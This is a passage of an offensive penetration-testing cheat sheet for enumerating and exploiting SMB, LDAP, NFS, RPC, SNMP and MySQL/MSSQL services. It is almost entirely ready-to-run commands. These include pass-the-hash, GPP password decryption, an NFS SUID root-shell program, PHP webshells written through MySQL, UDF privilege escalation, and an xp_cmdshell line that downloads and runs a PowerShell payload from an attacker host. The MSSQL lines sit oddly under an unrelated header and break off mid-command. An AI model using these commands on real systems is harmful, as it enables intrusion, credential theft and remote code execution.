# Netdata:       (no auth by default)
# Home Assistant:(no pass by default)

# ── TECHNOLOGY-SPECIFIC PATHS ─────────────────────────────────
# WordPress:  /wp-login.php /wp-admin /wp-json/wp/v2/users /xmlrpc.php
# Drupal:     /user/login /node/add /admin/config
# Joomla:     /administrator /configuration.php.bak
# Laravel:    /.env /storage/logs/laravel.log
# Rails:      /rails/info/properties /rails/info/routes
# Django:     /admin /static/admin
# Node/Express: /api/ /__express/ 
# Spring:     /actuator /actuator/env /actuator/heapdump /h2-console
# Struts:     *.action *.do






🖥️ 4.6 SMB --- Ports 139, 445

[PORT:445] [PORT:139] [SERVICE:SMB]


# ── FINGERPRINT ───────────────────────────────────────────────
nmap -sV -p139,445 $IP
nmap --script smb-os-discovery,smb-security-mode,smb2-security-mode -p445 $IP
nxc smb $IP   # Shows OS, hostname, domain, SMB signing status

# ── NULL SESSION / ANONYMOUS ──────────────────────────────────
smbclient -L //$IP -N                     # List shares (no auth)
smbmap -H $IP                             # Map shares
smbmap -H $IP -u '' -p ''                 # Explicit null
smbmap -H $IP -u 'guest' -p ''
nxc smb $IP --shares -u '' -p ''
nxc smb $IP --shares -u 'guest' -p ''

# ── CONNECT TO SHARES ─────────────────────────────────────────
smbclient //$IP/SHARE -N
smbclient //$IP/SHARE -U "user%password"
smbclient //$IP/SHARE -U "domain\\user%password"
# Inside smbclient:
smb: \> ls              # List
smb: \> recurse ON      # Enable recursive
smb: \> ls              # Now lists recursively
smb: \> prompt OFF      # Disable confirmation
smb: \> mget *          # Download everything
smb: \> put shell.asp   # Upload shell

# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
smbclient //$IP/SHARE -N -c 'recurse;prompt;mget *'
smbget -R smb://$IP/SHARE -U 'user%pass'
# Mount (easier for browsing):
mkdir /mnt/smb
mount -t cifs //$IP/SHARE /mnt/smb -o user=,password=
mount -t cifs //$IP/SHARE /mnt/smb -o user=user,password=pass,domain=DOMAIN

# ── FULL ENUMERATION ──────────────────────────────────────────
enum4linux -a $IP 2>/dev/null | tee scans/smb/enum4linux.txt
enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2>/dev/null

# nxc full sweep
nxc smb $IP -u user -p pass --shares
nxc smb $IP -u user -p pass --sessions
nxc smb $IP -u user -p pass --users
nxc smb $IP -u user -p pass --groups
nxc smb $IP -u user -p pass --computers
nxc smb $IP -u user -p pass --loggedon-users
nxc smb $IP -u user -p pass --disks
nxc smb $IP -u '' -p '' --rid-brute


# ── VULNERABILITY CHECKS ──────────────────────────────────────
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos -p445 $IP

# EternalBlue (MS17-010) manual check:
python3 checker.py $IP    # From exploit repo

# ── PASS THE HASH VIA SMB ─────────────────────────────────────
nxc smb $IP -u user -H NTLMHASH
nxc smb $IP -u Administrator -H HASH --sam
smbclient //$IP/SHARE -U user --pw-nt-hash NTLMHASH

# ── TIPS ──────────────────────────────────────────────────────
# Always look for:
#   - passwords in .txt .doc .xlsx .conf files
#   - scripts that run as another user (check scheduled tasks)
#   - writable shares → upload shell → find execution vector
#   - .ini files (autorun.ini can execute on connect)
#   - Sysvol/NETLOGON → Group Policy → GPP passwords (cpassword)
# GPP password decrypt:
gpp-decrypt "ENCRYPTEDPASSWORD"
# Or find in: \\DC\SYSVOL\domain\Policies\**\Groups.xml






📒 4.7 LDAP --- Ports 389, 636, 3268, 3269

[AD:LDAP] [PORT:389] [PORT:636]


# ── ANONYMOUS BIND ────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -b "" -s base
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=*)" > scans/ldap/anon_dump.txt

# ── AUTHENTICATED ─────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -w pass -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -D "domain\\user" -w pass -b "dc=domain,dc=com" "(objectClass=user)"

# ── USEFUL LDAP QUERIES ───────────────────────────────────────
# All users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
# All computers:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=computer)" name
# All groups:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=group)" name cn
# Admin users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(adminCount=1)" sAMAccountName
# Password policy:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=domain)" pwdProperties
# Users with SPN (Kerberoastable):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
# AS-REP Roastable (no preauth):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
# Descriptions (often contain passwords!):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" description sAMAccountName | grep -A1 "description:"

# ── LDAPDOMAINDUMP ────────────────────────────────────────────
ldapdomaindump -u 'domain\user' -p 'pass' $IP -o loot/ldap/
# Creates HTML/JSON/grep-able files of all objects

# ── TIPS ──────────────────────────────────────────────────────
# Port 3268 = Global Catalog (LDAP) — often more data
# Port 3269 = Global Catalog over SSL
# Always check description field — admins leave passwords here
# Check for "password" in any attribute:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" | grep -i pass






📂 4.8 NFS --- Port 2049

[LINUX:NFS] [PORT:2049]


# ── ENUMERATION ───────────────────────────────────────────────
showmount -e $IP
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 $IP
rpcinfo -p $IP | grep nfs

# ── MOUNT ─────────────────────────────────────────────────────
mkdir /mnt/nfs
mount -t nfs $IP:/share /mnt/nfs -o nolock
mount -t nfs4 $IP:/share /mnt/nfs   # NFSv4
ls -la /mnt/nfs                     # Check permissions

# ── NO_ROOT_SQUASH EXPLOIT ────────────────────────────────────
# Check /etc/exports on target (if readable):
cat /etc/exports     # Look for no_root_squash
# If present:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash   # Set SUID
# On target:
/mnt/nfs/bash -p         # Gives root

# Alternative — create SUID shell:
# On attacker:
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid
# On target: /tmp/suid

# ── UID IMPERSONATION ─────────────────────────────────────────
# If files owned by UID 1001 and you can't read them:
# Create user with same UID on your Kali:
useradd -u 1001 tempuser
su tempuser
cat /mnt/nfs/sensitive_file






🔌 4.9 RPC --- Ports 111, 135

[PORT:111] [PORT:135] [SERVICE:RPC]


# ── RPCBIND (111) ─────────────────────────────────────────────
rpcinfo -p $IP
nmap --script rpcinfo -p111 $IP

# ── RPCCLIENT (135) ───────────────────────────────────────────
rpcclient -U "" -N $IP         # Null session
rpcclient -U "user%pass" $IP

# Useful rpcclient commands:
rpcclient> srvinfo               # Server info
rpcclient> enumdomains           # List domains
rpcclient> querydominfo          # Domain info
rpcclient> enumdomusers          # List users
rpcclient> enumdomgroups         # List groups
rpcclient> queryuser 0x1f4       # User details (RID in hex)
rpcclient> getdompwinfo          # Password policy
rpcclient> enumalsgroups domain  # Alias groups
rpcclient> lookupnames user      # Get SID for user
rpcclient> lookupsids S-1-5-21-xxx-xxx-xxx-1000   # Get username for SID

# ── RID CYCLING (enumerate users) ─────────────────────────────
for i in $(seq 500 1200); do
  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep -i "user name"
done
# Or with nxc:
nxc smb $IP -u '' -p '' --rid-brute


# ── MSRPC SPECIFIC ATTACKS ────────────────────────────────────
# PrintNightmare check:
nmap --script msrpc-enum $IP
impacket-rpcdump $IP | grep -i print






📡 4.10 SNMP --- Port 161 UDP

[PORT:161] [SERVICE:SNMP]


# ── COMMUNITY STRING BRUTEFORCE ───────────────────────────────
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt $IP
# Or with nmap:
nmap -sU -p161 --script snmp-brute $IP

# ── SNMPWALK (dump everything) ────────────────────────────────
snmpwalk -c public -v1 $IP > scans/snmp/full.txt 2>/dev/null
snmpwalk -c public -v2c $IP > scans/snmp/full_v2.txt 2>/dev/null

# ── TARGETED OID QUERIES ──────────────────────────────────────
# Running processes (GOLD MINE — reveals service names/paths/args):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2
# Process command lines (even better — may show passwords in args!):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.5
# Installed software:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2
# Network interfaces:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.2.2.1
# Open TCP ports:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3
# User accounts:
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25
# System info:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.1

# ── SNMP-CHECK ────────────────────────────────────────────────
snmp-check $IP -c public -v 1
snmp-check $IP -c public -v 2c

# ── SNMPSET (write, if writable community) ────────────────────
snmpset -c private -v1 $IP 1.3.6.1.2.1.1.6.0 s "pwned"

# ── SNMP TO SHELL (if Net-SNMP with extend) ───────────────────
# If extend functionality enabled:
snmpwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# ── TIPS ──────────────────────────────────────────────────────
# Process args often leak: passwords, connection strings, API keys
# Windows SNMP leaks usernames, shares, services, software list
# SNMPv3 auth: snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass $IP

[PORT:3306] [SERVICE:MYSQL]


# ── CONNECT ───────────────────────────────────────────────────
mysql -h $IP -u root -p

mysql -h $IP -u root --password=root

# ── ENUMERATION ───────────────────────────────────────────────
SHOW databases;
USE mysql;
SHOW tables;
SELECT * FROM user;                  # Username + password hashes
SELECT user, host, authentication_string FROM mysql.user;
SELECT @@hostname, @@datadir, @@version, @@global.secure_file_priv;
SHOW variables LIKE 'secure_file_priv';  # Empty = can read/write anywhere!

# ── FILE READ ─────────────────────────────────────────────────
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/var/www/html/config.php');

# ── FILE WRITE → WEBSHELL ─────────────────────────────────────
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
-- Need: FILE privilege + secure_file_priv = '' + write access to path

# ── UDF PRIVILEGE ESCALATION ──────────────────────────────────
# If running as root + plugin_dir writable:
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('id > /tmp/out; chown user /tmp/out');

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.

EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';

-- If can't enable directly:

EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
